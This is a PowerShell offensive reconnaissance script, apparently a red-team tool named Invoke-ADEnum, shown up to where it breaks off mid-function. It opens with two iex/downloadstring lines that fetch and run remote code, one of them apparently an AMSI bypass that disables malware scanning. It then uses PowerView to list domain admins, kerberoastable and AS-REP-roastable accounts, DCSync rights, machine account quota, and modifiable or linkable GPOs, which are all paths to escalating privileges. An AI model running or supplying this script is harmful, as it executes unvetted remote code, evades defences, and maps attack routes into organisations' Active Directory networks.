iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

function Invoke-ADEnum
{
<#

.SYNOPSIS
Active Directory PowerView Enumerator

.PARAMETER Domain
The Domain to enumerate for (requires you specify a Server)

.PARAMETER Server
The DC to bind to (requires you specify a Domain)

.EXAMPLE - Run for each domain you can find
Invoke-ADEnum

.EXAMPLE - Run for a specific Domain/DC
Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>

#>

	[CmdletBinding()] Param(

		[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
		[String]
		$Domain,

		[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
		[String]
		$Server

	)
	
	if($Domain -OR $Server) {
		$DomainParam = [Parameter(Mandatory=$True, Position=1, ValueFromPipeline=$true)][String]$Domain
		$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
	}

	$ErrorActionPreference = "SilentlyContinue"
	
	Write-Host ""
	Write-Host "Current Domain:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-NetDomain -Domain $Domain | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}
	else{
		Get-NetDomain | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}

	Write-Host ""
	Write-Host "Parent and Child Domains:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$DomainForest = (Get-NetDomain -Domain $Domain | Select-Object -ExpandProperty Forest)
		Get-NetDomain -Domain $DomainForest | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}
	else{
		$DomainForest = (Get-NetDomain | Select-Object -ExpandProperty Forest)
		Get-NetDomain -Domain $DomainForest | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}
	
	# All Domains
	$ParentDomain = (Get-NetDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
	$ChildDomains = (Get-NetDomain -Domain $ParentDomain | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)

	if($ChildDomains){
		$AllDomains = $ParentDomain + "`n"
		foreach($ChildDomain in $ChildDomains){
			$AllDomains += $ChildDomain + "`n"
		}
		$AllDomains = ($AllDomains | Out-String) -split "`n"
		$AllDomains = $AllDomains.Trim()
		$AllDomains = $AllDomains | Where-Object { $_ -ne "" }
	}

	else{$AllDomains = $ParentDomain}
	
	# Trust Domains (save to variable)
	
	if($Domain -AND $Server) {
		$TrustTargetNames = (Get-DomainTrust -Domain $Domain -Server $Server).TargetName
		$TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
		$TrustTargetNames = $TrustTargetNames.Trim()
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
		$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $Domain }
	}
	
	else{
		$TrustTargetNames = foreach($AllDomain in $AllDomains){(Get-DomainTrust -Domain $AllDomain).TargetName}
		$TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
		$TrustTargetNames = $TrustTargetNames.Trim()
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
		$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
	}
	
	# Remove Outbound Trust from $AllDomains
	
	if($Domain -AND $Server) {
		$OutboundTrusts = Get-DomainTrust -Domain $Domain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
	}
	
	else{
		$OutboundTrusts = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
	}
	
	$AllDomains += $TrustTargetNames
	$PlaceHolderDomains = $AllDomains
	$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }

	Write-Host ""
	Write-Host "Domain SIDs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$DomainSID = Get-DomainSID -Domain $Domain -Server $Server | ft -Autosize -Wrap
		
		[PSCustomObject]@{
			DomainName = $Domain
			DomainSID  = $DomainSID
		} | Format-Table -AutoSize -Wrap
	}
	
	else{
		$AllDomains | ForEach-Object {
			$DomainName = $_
			$DomainSID = Get-DomainSID -Domain $DomainName
			[PSCustomObject]@{
				DomainName = $DomainName
				DomainSID  = $DomainSID
			}
		} | Format-Table -AutoSize -Wrap
	}
	
	Write-Host ""
	Write-Host "Domains for the current forest:" -ForegroundColor Cyan
	Get-ForestDomain | Format-Table -AutoSize -Wrap

	Write-Host ""
	Write-Host "Forest Global Catalog:" -ForegroundColor Cyan
	Get-ForestGlobalCatalog | Select Name, Forest, Domain, IPAddress | Format-Table -AutoSize -Wrap

	Write-Host ""
	Write-Host "Domain Trusts:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainTrust -Domain $Domain -Server $Server | Format-Table -AutoSize -Wrap
	}
	
	else{
		foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Domain Controllers:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-NetDomainController -Domain $Domain | Select Name, Forest, Domain, IPAddress | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-NetDomainController -Domain $AllDomain | Select Name, Forest, Domain, IPAddress | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Servers:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Workstations:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
	}

	#Write-Host ""
	#Write-Host "All Groups:" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | select SamAccountName, objectsid, @{Name='Members';Expression={(Get-DomainGroupMember -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | ft -Autosize -Wrap}

	Write-Host ""
	Write-Host "Admin Groups:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server | where Name -like "*Admin*" | select SamAccountName, objectsid, @{Name="Domain";Expression={$Domain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | where Name -like "*Admin*" | select SamAccountName, objectsid, @{Name="Domain";Expression={$AllDomain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap}
	}

	if($TrustTargetNames){
		Write-Host ""
		Write-Host "Groups that contain users outside of its domain and return its members:" -ForegroundColor Cyan
		foreach($TrustTargetName in $TrustTargetNames){
			if($Domain -AND $Server) {
				Get-DomainForeignGroupMember -Domain $TrustTargetName -Server $Server | Select-Object GroupDomain, GroupName, GroupDistinguishedName, MemberDomain, @{Name="Member|GroupName";Expression={(ConvertFrom-SID $_.MemberName)}}, @{Name="Members";Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity (ConvertFrom-SID $_.MemberName)).MemberName -join ' - '}}, @{Name="SID";Expression={($_.MemberName)}} | Format-Table -AutoSize -Wrap
			}
			
			else{
				Get-DomainForeignGroupMember -Domain $TrustTargetName | Select-Object GroupDomain, GroupName, GroupDistinguishedName, MemberDomain, @{Name="Member|GroupName";Expression={(ConvertFrom-SID $_.MemberName)}}, @{Name="Members";Expression={(Get-DomainGroupMember -Recurse -Identity (ConvertFrom-SID $_.MemberName)).MemberName}}, @{Name="SID";Expression={($_.MemberName) -join ' - '}} | Format-Table -AutoSize -Wrap
			}
		}
	}

	Write-Host ""
	Write-Host "Other Groups:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server | Where-Object { $_.SamAccountName -notlike "*Admin*" } | select SamAccountName, objectsid, @{Name="Domain";Expression={$Domain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}}, @{Name='MembersDistinguishedName';Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | Where-Object { $_.SamAccountName -notlike "*Admin*" } | select SamAccountName, objectsid, @{Name="Domain";Expression={$AllDomain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}}, @{Name='MembersDistinguishedName';Expression={(Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Groups by keyword:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *SQL* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *Exchange* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *Desktop* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *VEEAM* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *PSM* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *Password* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){
			Get-DomainGroup -Domain $AllDomain -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *Exchange* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *Desktop* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *VEEAM* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *PSM* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *Password* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
		}
	}

	Write-Host ""
	Write-Host "Enterprise Administrators:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Enterprise Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroupMember -Domain $AllDomain -Identity "Enterprise Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Domain Administrators:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Domain Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroupMember -Domain $AllDomain -Identity "Domain Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Service Accounts:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -SPN -Domain $Domain -Server $Server | select samaccountname, description, @{Name='Groups';Expression={(Get-DomainGroup -Domain $Domain -Server $Server -UserName $_.samaccountname).Name -join ' - '}}, @{Name="Domain";Expression={$Domain}} | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -SPN -Domain $AllDomain | select samaccountname, description, @{Name='Groups';Expression={(Get-DomainGroup -UserName $_.samaccountname).Name -join ' - '}}, @{Name="Domain";Expression={$AllDomain}} | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Users who don't have kerberos preauthentication set:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -PreauthNotRequired | Select-Object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
		#Get-DomainUser -UACFilter DONT_REQ_PREAUTH | select samaccountname | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain -PreauthNotRequired | Select-Object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Service accounts in 'Domain Admins':" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -SPN | ?{$_.memberof -match 'Domain Admins'} | Select-Object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain -SPN | ?{$_.memberof -match 'Domain Admins'} | Select-Object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Users with sidHistory set:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter '(sidHistory=*)' | Select-Object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain -LDAPFilter '(sidHistory=*)' | Select-Object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Retrieve *most* users who can perform DC replication (i.e. DCsync):" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){$dcName = "dc=" + $AllDomain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObjectAcl "$dcName" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}}
	if($Domain -AND $Server) {
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		Get-DomainObjectAcl "$dcName" -Domain $Domain -Server $Server -ResolveGUIDs |
			? {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
			select @{Name="SecurityIdentifier"; Expression={ConvertFrom-SID -Server $Server $_.SecurityIdentifier}} |
			ft -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains) {
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			Get-DomainObjectAcl "$dcName" -ResolveGUIDs |
				? {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
				select @{Name="SecurityIdentifier"; Expression={ConvertFrom-SID $_.SecurityIdentifier}} |
				ft -AutoSize -Wrap
		}
	}

	Write-Host ""
	Write-Host "Linked DA accounts using name correlation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroupMember 'Domain Admins' -Domain $Domain -Server $Server | %{Get-DomainUser $_.membername -Domain $Domain -Server $Server -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname} | Select-Object displayname, samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroupMember 'Domain Admins' -Domain $AllDomain | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -Domain $AllDomain -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname} | Select-Object displayname, samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Domain Policy:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		(Get-DomainPolicy -Domain $Domain -Server $Server).SystemAccess | Select-Object MinimumPasswordAge, MaximumPasswordAge, MinimumPasswordLength, PasswordComplexity, PasswordHistorySize, LockoutBadCount, ResetLockoutCount, LockoutDuration, RequireLogonToChangePassword, @{Name="Domain"; Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){(Get-DomainPolicy -Domain $AllDomain).SystemAccess | Select-Object MinimumPasswordAge, MaximumPasswordAge, MinimumPasswordLength, PasswordComplexity, PasswordHistorySize, LockoutBadCount, ResetLockoutCount, LockoutDuration, RequireLogonToChangePassword, @{Name="Domain"; Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "How many computer objects can we create:" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){$dcName = "dc=" + $AllDomain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObject -Domain $AllDomain -Identity "$dcName" -Properties ms-DS-MachineAccountQuota}

	if($Domain -AND $Server) {
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		$Quota = (Get-DomainObject -Domain $Domain -Server $Server -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
		[pscustomobject]@{
			'Domain' = $Domain
			'Quota' = $Quota
		} | ft -AutoSize
	}
	else{
		$Result = foreach($AllDomain in $AllDomains){
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			$Quota = (Get-DomainObject -Domain $AllDomain -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
			[pscustomobject]@{
				'Domain' = $AllDomain
				'Quota' = $Quota
			}
		}
		$Result | ft -AutoSize
	}

	Write-Host ""
	Write-Host "Domain OUs:" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){Get-DomainOU -Domain $AllDomain -Properties Name | sort -Property Name | ft -Autosize -Wrap}
	#foreach($AllDomain in $AllDomains){Get-DomainOU -Domain $AllDomain | select name, @{Name='Users';Expression={(Get-DomainGroupMember -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}}, @{Name='Computers';Expression={%(Get-DomainComputer -SearchBase "ldap://$_.distinguishedname") -join ' - '}} | ft -Autosize -Wrap}
	if($Domain -AND $Server) {
		Get-DomainOU -Domain $Domain -Server $Server | ForEach-Object {
			$ou = $_
			$users = (Get-DomainUser -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
			$computers = Get-DomainComputer -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)"
			[PSCustomObject]@{
				Name = $ou.Name
				Users = $users -join ' - '
				Computers = ($computers.Name -join ' - ')
				Domain = $Domain
			}
		} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){
			Get-DomainOU -Domain $AllDomain | ForEach-Object {
				$ou = $_
				$users = (Get-DomainUser -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
				$computers = Get-DomainComputer -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)"
				[PSCustomObject]@{
					Name = $ou.Name
					Users = $users -join ' - '
					Computers = ($computers.Name -join ' - ')
					Domain = $AllDomain
				}
			} | Format-Table -AutoSize -Wrap
		}
	}

	Write-Host ""
	Write-Host "Logged on users for all machines in any Server OU:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainOU -Identity *server* -Domain $Domain -Server $Server | %{Get-DomainComputer -Domain $Domain -Server $Server -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -Domain $Domain -Server $Server -ComputerName $_}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainOU -Identity *server* -Domain $AllDomain | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}} | Format-Table -AutoSize -Wrap}
	}


	Write-Host ""
	Write-Host "Domain GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Who can create GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		#Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		Get-DomainObjectAcl -Domain $Domain -Server $Server -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server }
	}
	else{
		foreach($AllDomain in $AllDomains){
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			Get-DomainObjectAcl -Domain $AllDomain -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
		}
	}

	Write-Host ""
	Write-Host "Who can modify existing GPOs:" -ForegroundColor Cyan
	Write-Host ""
	
	if($Domain -AND $Server) {
		$jSIDdomain = Get-DomainSID -Domain $Domain -Server $Server
		
		$jGPOIDRAW = (Get-DomainGPO -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
		
		$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
		
		if($jGPOIDRAW){
			foreach($jGPOID in $jGPOIDs){
				Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
				Get-DomainGPO -Domain $Domain -Server $Server -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
				Write-Host "Who can edit the policy: " -ForegroundColor Yellow
				echo " "
				$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
				foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
				echo " "
				echo " "
				Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
				Get-DomainOU -Domain $Domain -Server $Server -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
				echo "======================="
				echo "======================="
				echo " "
			}
		}
	}
	else{
		foreach($AllDomain in $AllDomains){

			$jSIDdomain = Get-DomainSID -Domain $AllDomain
			
			$jGPOIDRAW = (Get-DomainGPO -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
			
			$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
			
			if($jGPOIDRAW){
				foreach($jGPOID in $jGPOIDs){
					Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
					Get-DomainGPO -Domain $AllDomain -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
					Write-Host "Who can edit the policy: " -ForegroundColor Yellow
					echo " "
					$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
					foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
					echo " "
					echo " "
					Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
					Get-DomainOU -Domain $AllDomain -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
					echo "======================="
					echo "======================="
					echo " "
				}
			}

		}
	}

	Write-Host ""
	Write-Host "Who can link GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		#foreach($AllDomain in $AllDomains){$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }); $gpolinkresult | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl; $SIDresolvesto = ConvertFrom-SID $gpolinkresult.SecurityIdentifier ; Write-Host "SecurityIdentifier resolves to " -NoNewline; Write-Host "$SIDresolvesto" -ForegroundColor Yellow}
		$gpolinkresult = (Get-DomainOU -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
		$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier)}} | Format-List
	}
	else{
		foreach($AllDomain in $AllDomains){
			$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
			$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID $_.SecurityIdentifier)}} | Format-List
		}
	}


	Write-Host ""
	Write-Host "LAPS GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
